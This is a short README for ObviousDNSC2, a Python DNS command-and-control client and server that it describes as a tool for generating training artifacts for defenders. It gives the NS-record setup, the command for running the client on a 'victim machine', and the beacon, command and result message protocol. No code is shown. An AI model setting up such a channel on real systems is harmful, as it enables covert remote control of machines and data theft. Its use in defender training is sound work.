# ObviousDNSC2
Simple DNS C2 with Python client and server

## Purpose
A plain-as-possible DNS C2 framework with both client and server written in Python. This is designed as an artifact generation tool for training defenders.

## Setup
Configure a DNS record (like, with a legit registrar) with an NS record that points to a public asset you control. Example:
`odc2.SomeDomainIOwn.com`, pointing to `myVPC.SomeDomainIOwn.com`.

On that VPC, install and run the server.

On the victim machine, run `odc2client.py -d odc2.SomeDomainIOwn.com`

## Message Flow
`Client             Server`  
`CHK                NUL`  
`CHK                HDR<num CMD pkts>`  
`CON<last pkt num>  CMD<pkt num>`  
`HDR<num RES pkts>  ACK<num RES pkts>`  
`RES<pkt num>       ACK<pkt num>`  

`STP` from server ends current `RES` thread
`DIE` from server closes client
